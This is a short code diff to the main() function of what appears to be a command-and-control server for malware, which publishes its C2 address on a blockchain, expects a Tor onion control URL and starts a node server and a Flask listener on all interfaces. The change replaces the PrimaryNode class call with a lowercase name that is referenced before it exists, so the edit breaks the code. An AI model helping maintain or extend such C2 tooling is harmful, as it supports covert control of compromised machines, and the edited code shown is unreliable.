@@ -392,7 +392,7 @@ def main():
         update_c2_url_on_blockchain(current_url)
 
     # Start the PrimaryNode
-    primary_node = PrimaryNode(handle_client_request=handle_client_request)
+    primary_node = primary_node(handle_client_request=handle_client_request)
     primary_node.start_server()
 
     # Start Flask server
@@ -403,7 +403,7 @@ def main():
         print(f"[*] {message}")
     else:
         logger.warning("No control URL configured; update CONTROL-URL for onion address.")
-    
+
     app.run(host='0.0.0.0', port=5000)
 
 if __name__ == '__main__':
